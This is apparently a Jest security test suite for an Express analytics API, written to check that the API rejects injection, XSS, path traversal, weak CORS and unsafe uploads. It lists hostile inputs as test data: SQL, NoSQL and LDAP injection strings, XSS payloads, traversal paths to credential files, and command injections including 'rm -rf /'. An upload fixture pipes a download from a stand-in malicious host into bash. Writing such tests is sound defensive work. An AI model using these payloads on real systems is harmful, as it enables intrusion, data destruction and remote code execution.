import crypto from 'crypto';
import express from 'express';
import request from 'supertest';

// Create a mock app for testing since the main app may not have default export
const app = express();
app.use(express.json());

describe('Security Tests', () => {
  beforeEach(() => {
    jest.clearAllMocks();
  });

  describe('Input Validation & Sanitization', () => {
    test('should prevent SQL injection in query parameters', async () => {
      const maliciousInputs = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "'; DELETE FROM events WHERE 1=1; --",
        "UNION SELECT * FROM users",
        "'; INSERT INTO admin VALUES ('hacker', 'password'); --"
      ];

      for (const input of maliciousInputs) {
        const response = await request(app)
          .get('/api/v1/integrations')
          .query({ type: input })
          .set('X-API-Key', 'valid-test-key');

        // Should either reject with 400 or sanitize the input
        if (response.status === 400) {
          expect(response.body.error).toContain('validation');
        } else {
          // If not rejected, ensure no SQL commands in response
          const responseStr = JSON.stringify(response.body);
          expect(responseStr.toLowerCase()).not.toContain('drop table');
          expect(responseStr.toLowerCase()).not.toContain('delete from');
          expect(responseStr.toLowerCase()).not.toContain('insert into');
        }
      }
    });

    test('should prevent XSS in request bodies', async () => {
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        'javascript:alert("XSS")',
        '<img src=x onerror=alert("XSS")>',
        '<svg onload=alert("XSS")>',
        '"><script>alert("XSS")</script>',
        "'; alert('XSS'); //",
        '<iframe src="javascript:alert(\'XSS\')"></iframe>'
      ];

      for (const payload of xssPayloads) {
        const response = await request(app)
          .post('/api/events/track')
          .set('X-API-Key', 'valid-test-key')
          .send({
            event: 'test_event',
            properties: {
              malicious_field: payload,
              description: `User input: ${payload}`
            }
          });

        // Should either reject or sanitize
        if (response.status === 201) {
          const responseStr = JSON.stringify(response.body);
          expect(responseStr).not.toContain('<script>');
          expect(responseStr).not.toContain('javascript:');
          expect(responseStr).not.toContain('onerror=');
          expect(responseStr).not.toContain('onload=');
        }
      }
    });

    test('should validate and limit request payload size', async () => {
      const largePayload = {
        event: 'large_event',
        properties: {
          data: 'x'.repeat(20 * 1024 * 1024) // 20MB payload
        }
      };

      const response = await request(app)
        .post('/api/events/track')
        .set('X-API-Key', 'valid-test-key')
        .send(largePayload);

      expect(response.status).toBe(413); // Payload too large
      expect(response.body.error).toContain('too large');
    });

    test('should reject malformed JSON', async () => {
      const response = await request(app)
        .post('/api/events/track')
        .set('X-API-Key', 'valid-test-key')
        .set('Content-Type', 'application/json')
        .send('{"event": "test", "properties": {malformed json}');

      expect(response.status).toBe(400);
      expect(response.body.error).toContain('Invalid JSON');
    });

    test('should sanitize file upload paths', async () => {
      const maliciousPaths = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '/var/log/auth.log',
        '../../../../sensitive.txt',
        'config/../../../secrets.env'
      ];

      for (const path of maliciousPaths) {
        const response = await request(app)
          .post('/api/v1/integrations')
          .set('X-API-Key', 'valid-test-key')
          .send({
            name: 'Test Integration',
            type: 'webhook',
            configuration: {
              config_file: path
            }
          });

        // Should reject path traversal attempts
        if (response.status === 400) {
          expect(response.body.error).toContain('Invalid');
        } else {
          // Ensure path is sanitized
          expect(response.body.configuration?.config_file).not.toContain('../');
          expect(response.body.configuration?.config_file).not.toContain('..\\');
        }
      }
    });
  });

  describe('Authentication Security', () => {
    test('should prevent brute force attacks on API keys', async () => {
      const invalidKey = 'invalid-key-12345';
      const requests = [];

      // Attempt multiple invalid authentications
      for (let i = 0; i < 20; i++) {
        requests.push(
          request(app)
            .get('/api/v1/integrations')
            .set('X-API-Key', `${invalidKey}-${i}`)
        );
      }

      const responses = await Promise.all(requests);

      // After several failed attempts, should implement rate limiting
      const rateLimitedResponses = responses.filter(r => r.status === 429);
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    });

    test('should reject expired JWT tokens', async () => {
      const expiredToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyLTEyMyIsImV4cCI6MTYwOTQ1OTIwMH0.invalid';

      const response = await request(app)
        .get('/api/v1/integrations')
        .set('Authorization', `Bearer ${expiredToken}`);

      expect(response.status).toBe(401);
      expect(response.body.error).toContain('token');
    });

    test('should prevent session fixation attacks', async () => {
      // Attempt to set session ID via query parameter
      const response = await request(app)
        .get('/api/v1/integrations?sessionid=malicious-session-id')
        .set('X-API-Key', 'valid-test-key');

      // Should not accept session ID from query parameters
      expect(response.headers['set-cookie']).not.toContain('malicious-session-id');
    });

    test('should implement secure cookie settings', async () => {
      const response = await request(app)
        .post('/auth/login')
        .send({
          username: 'test@example.com',
          password: 'validpassword'
        });

      const cookies = response.headers['set-cookie'];
      if (cookies && Array.isArray(cookies)) {
        cookies.forEach((cookie: string) => {
          expect(cookie).toContain('HttpOnly');
          expect(cookie).toContain('Secure');
          expect(cookie).toContain('SameSite');
        });
      }
    });

    test('should prevent timing attacks on authentication', async () => {
      const validKey = 'ak_test_valid_key_12345';
      const invalidKey = 'ak_test_invalid_key_12345';

      // Measure response time for valid and invalid keys
      const validKeyTimes = [];
      const invalidKeyTimes = [];

      for (let i = 0; i < 10; i++) {
        // Valid key timing
        const validStart = process.hrtime.bigint();
        await request(app)
          .get('/api/v1/integrations')
          .set('X-API-Key', validKey);
        const validEnd = process.hrtime.bigint();
        validKeyTimes.push(Number(validEnd - validStart) / 1000000); // Convert to ms

        // Invalid key timing
        const invalidStart = process.hrtime.bigint();
        await request(app)
          .get('/api/v1/integrations')
          .set('X-API-Key', invalidKey);
        const invalidEnd = process.hrtime.bigint();
        invalidKeyTimes.push(Number(invalidEnd - invalidStart) / 1000000);
      }

      const validAvg = validKeyTimes.reduce((a, b) => a + b) / validKeyTimes.length;
      const invalidAvg = invalidKeyTimes.reduce((a, b) => a + b) / invalidKeyTimes.length;

      // Response times should not differ significantly (within 50ms)
      expect(Math.abs(validAvg - invalidAvg)).toBeLessThan(50);
    });
  });

  describe('CORS & Cross-Origin Security', () => {
    test('should implement proper CORS headers', async () => {
      const response = await request(app)
        .options('/api/events/track')
        .set('Origin', 'https://trusted-domain.com')
        .set('Access-Control-Request-Method', 'POST');

      expect(response.headers['access-control-allow-origin']).toBeDefined();
      expect(response.headers['access-control-allow-methods']).toBeDefined();
      expect(response.headers['access-control-allow-headers']).toBeDefined();
    });

    test('should reject requests from unauthorized origins', async () => {
      const maliciousOrigins = [
        'https://malicious-site.com',
        'http://attacker.evil.com',
        'javascript:alert("XSS")',
        'data:text/html,<script>alert("XSS")</script>'
      ];

      for (const origin of maliciousOrigins) {
        const response = await request(app)
          .post('/api/events/track')
          .set('Origin', origin)
          .set('X-API-Key', 'valid-test-key')
          .send({
            event: 'test_event',
            properties: {}
          });

        // Should either reject the origin or not include it in CORS headers
        if (response.headers['access-control-allow-origin']) {
          expect(response.headers['access-control-allow-origin']).not.toBe(origin);
        }
      }
    });

    test('should prevent JSONP injection', async () => {
      const callbackPayloads = [
        'alert("XSS")',
        'eval("malicious_code")',
        'document.cookie="hacked=true"',
        'window.location="https://attacker.com"'
      ];

      for (const callback of callbackPayloads) {
        const response = await request(app)
          .get('/api/v1/integrations')
          .query({ callback })
          .set('X-API-Key', 'valid-test-key');

        // Should not execute JSONP with malicious callbacks
        expect(response.text).not.toContain('alert(');
        expect(response.text).not.toContain('eval(');
        expect(response.text).not.toContain('document.cookie');
      }
    });
  });

  describe('Rate Limiting & DDoS Protection', () => {
    test('should implement rate limiting per IP', async () => {
      const requests = [];

      // Rapid requests from same IP
      for (let i = 0; i < 100; i++) {
        requests.push(
          request(app)
            .get('/api/events/health')
            .set('X-Forwarded-For', '192.168.1.100')
        );
      }

      const responses = await Promise.all(requests);
      const rateLimited = responses.filter(r => r.status === 429);

      expect(rateLimited.length).toBeGreaterThan(0);
    });

    test('should implement rate limiting per API key', async () => {
      const apiKey = 'rate-limited-test-key';
      const requests = [];

      for (let i = 0; i < 50; i++) {
        requests.push(
          request(app)
            .post('/api/events/track')
            .set('X-API-Key', apiKey)
            .send({
              event: 'rate_limit_test',
              properties: { index: i }
            })
        );
      }

      const responses = await Promise.all(requests);
      const rateLimited = responses.filter(r => r.status === 429);

      expect(rateLimited.length).toBeGreaterThan(0);

      // Check for rate limit headers
      const successfulResponse = responses.find(r => r.status === 201);
      if (successfulResponse) {
        expect(successfulResponse.headers['x-ratelimit-limit']).toBeDefined();
        expect(successfulResponse.headers['x-ratelimit-remaining']).toBeDefined();
      }
    });

    test('should handle burst traffic patterns', async () => {
      // Simulate burst: many requests in short time, then pause
      const burstRequests = [];

      for (let i = 0; i < 30; i++) {
        burstRequests.push(
          request(app)
            .get('/api/events/health')
            .set('X-API-Key', 'burst-test-key')
        );
      }

      const burstResponses = await Promise.all(burstRequests);

      // Wait for rate limit window to reset
      await new Promise(resolve => setTimeout(resolve, 2000));

      // Should allow requests after reset
      const postBurstResponse = await request(app)
        .get('/api/events/health')
        .set('X-API-Key', 'burst-test-key');

      expect(postBurstResponse.status).toBe(200);
    });
  });

  describe('Data Privacy & GDPR Compliance', () => {
    test('should respect Do Not Track header', async () => {
      const response = await request(app)
        .post('/api/events/track')
        .set('DNT', '1')
        .set('X-API-Key', 'valid-test-key')
        .send({
          event: 'privacy_test',
          properties: {
            user_id: 'test-user',
            email: 'test@example.com'
          }
        });

      // Should either reject tracking or anonymize data
      expect([204, 200]).toContain(response.status);

      if (response.status === 200) {
        // Data should be anonymized
        expect(response.body).not.toContain('test@example.com');
      }
    });

    test('should handle PII data appropriately', async () => {
      const piiData = {
        event: 'user_registration',
        properties: {
          email: 'user@example.com',
          phone: '+1234567890',
          ssn: '123-45-6789',
          credit_card: '4111-1111-1111-1111',
          name: 'John Doe',
          address: '123 Main St, City, State'
        }
      };

      const response = await request(app)
        .post('/api/events/track')
        .set('X-API-Key', 'valid-test-key')
        .send(piiData);

      expect(response.status).toBe(201);

      // Sensitive fields should be filtered or encrypted
      const responseStr = JSON.stringify(response.body);
      expect(responseStr).not.toContain('123-45-6789'); // SSN
      expect(responseStr).not.toContain('4111-1111-1111-1111'); // Credit card
    });

    test('should support data anonymization requests', async () => {
      const userId = 'user-to-anonymize';

      const response = await request(app)
        .post('/api/privacy/anonymize')
        .set('X-API-Key', 'admin-test-key')
        .send({
          user_id: userId,
          anonymization_type: 'full'
        });

      expect([200, 202]).toContain(response.status);
      expect(response.body.message).toContain('anonymization');
    });
  });

  describe('Injection Attack Prevention', () => {
    test('should prevent NoSQL injection', async () => {
      const nosqlPayloads = [
        { $ne: null },
        { $gt: '' },
        { $where: 'this.username == this.password' },
        { $regex: '.*' },
        { $text: { $search: 'admin' } }
      ];

      for (const payload of nosqlPayloads) {
        const response = await request(app)
          .get('/api/v1/integrations')
          .query({ filter: JSON.stringify(payload) })
          .set('X-API-Key', 'valid-test-key');

        // Should reject NoSQL injection attempts
        if (response.status === 400) {
          expect(response.body.error).toContain('Invalid');
        }
      }
    });

    test('should prevent command injection', async () => {
      const commandPayloads = [
        '; ls -la',
        '| cat /etc/passwd',
        '&& rm -rf /',
        '$(whoami)',
        '`id`',
        '; DROP TABLE users; --'
      ];

      for (const payload of commandPayloads) {
        const response = await request(app)
          .post('/api/v1/integrations')
          .set('X-API-Key', 'valid-test-key')
          .send({
            name: 'Test Integration',
            type: 'webhook',
            configuration: {
              command: payload
            }
          });

        // Should sanitize or reject command injection
        expect(response.status).not.toBe(500);
        if (response.status === 201) {
          expect(response.body.configuration?.command).not.toContain(';');
          expect(response.body.configuration?.command).not.toContain('|');
          expect(response.body.configuration?.command).not.toContain('&&');
        }
      }
    });

    test('should prevent LDAP injection', async () => {
      const ldapPayloads = [
        '*)(&',
        '*)(uid=*',
        '*))(|(uid=*',
        '*(|(password=*))',
        '*(|(mail=*))'
      ];

      for (const payload of ldapPayloads) {
        const response = await request(app)
          .post('/auth/login')
          .send({
            username: payload,
            password: 'password'
          });

        // Should handle LDAP injection attempts safely
        expect(response.status).toBe(401); // Unauthorized, not server error
        expect(response.body.error).not.toContain('LDAP');
      }
    });
  });

  describe('Security Headers', () => {
    test('should include all required security headers', async () => {
      const response = await request(app)
        .get('/api/events/health');

      const securityHeaders = {
        'x-content-type-options': 'nosniff',
        'x-frame-options': 'DENY',
        'x-xss-protection': '1; mode=block',
        'strict-transport-security': /max-age=\d+/,
        'content-security-policy': /.+/,
        'referrer-policy': 'strict-origin-when-cross-origin'
      };

      Object.entries(securityHeaders).forEach(([header, expectedValue]) => {
        expect(response.headers[header]).toBeDefined();
        if (typeof expectedValue === 'string') {
          expect(response.headers[header]).toBe(expectedValue);
        } else {
          expect(response.headers[header]).toMatch(expectedValue);
        }
      });
    });

    test('should not expose sensitive server information', async () => {
      const response = await request(app)
        .get('/api/events/health');

      // Should not expose server technology details
      expect(response.headers['server']).toBeUndefined();
      expect(response.headers['x-powered-by']).toBeUndefined();

      // Should not include detailed error information in production
      if (process.env.NODE_ENV === 'production') {
        expect(response.body).not.toHaveProperty('stack');
        expect(response.body).not.toHaveProperty('trace');
      }
    });
  });

  describe('Cryptographic Security', () => {
    test('should use secure random token generation', async () => {
      const tokens = new Set();

      // Generate multiple tokens to check randomness
      for (let i = 0; i < 100; i++) {
        const token = crypto.randomBytes(32).toString('hex');
        expect(token).toHaveLength(64);
        expect(tokens.has(token)).toBe(false); // Should be unique
        tokens.add(token);
      }
    });

    test('should implement proper password hashing', async () => {
      const passwords = ['password123', 'admin', 'test'];
      const hashes = new Set();

      for (const password of passwords) {
        const response = await request(app)
          .post('/auth/register')
          .send({
            email: `test-${Date.now()}@example.com`,
            password: password
          });

        if (response.status === 201) {
          const hash = response.body.passwordHash;

          // Hash should not be plaintext
          expect(hash).not.toBe(password);

          // Hashes should be unique even for same password
          expect(hashes.has(hash)).toBe(false);
          hashes.add(hash);

          // Should use strong hashing (bcrypt/scrypt/argon2)
          expect(hash).toMatch(/^\$2[aby]\$|^\$scrypt\$|^\$argon2/);
        }
      }
    });

    test('should implement secure session tokens', async () => {
      const response = await request(app)
        .post('/auth/login')
        .send({
          username: 'test@example.com',
          password: 'validpassword'
        });

      if (response.status === 200) {
        const sessionToken = response.body.sessionToken;

        // Token should be sufficiently long and random
        expect(sessionToken).toBeDefined();
        expect(sessionToken.length).toBeGreaterThan(32);
        expect(sessionToken).toMatch(/^[a-zA-Z0-9+/=]+$/); // Base64-like format
      }
    });
  });

  describe('File Upload Security', () => {
    test('should validate file types and extensions', async () => {
      const maliciousFiles = [
        { name: 'malware.exe', type: 'application/octet-stream' },
        { name: 'script.php', type: 'application/x-php' },
        { name: 'shell.sh', type: 'application/x-sh' },
        { name: 'config.js', type: 'application/javascript' }
      ];

      for (const file of maliciousFiles) {
        const response = await request(app)
          .post('/api/uploads')
          .set('X-API-Key', 'valid-test-key')
          .attach('file', Buffer.from('malicious content'), file.name);

        // Should reject dangerous file types
        expect(response.status).toBe(400);
        expect(response.body.error).toContain('file type');
      }
    });

    test('should scan uploaded files for malware signatures', async () => {
      const suspiciousContent = Buffer.from(`
        #!/bin/bash
        rm -rf /
        curl -s http://malicious-site.com/payload | bash
      `);

      const response = await request(app)
        .post('/api/uploads')
        .set('X-API-Key', 'valid-test-key')
        .attach('file', suspiciousContent, 'innocent.txt');

      // Should detect and reject malicious content
      expect(response.status).toBe(400);
      expect(response.body.error).toContain('security');
    });
  });
});
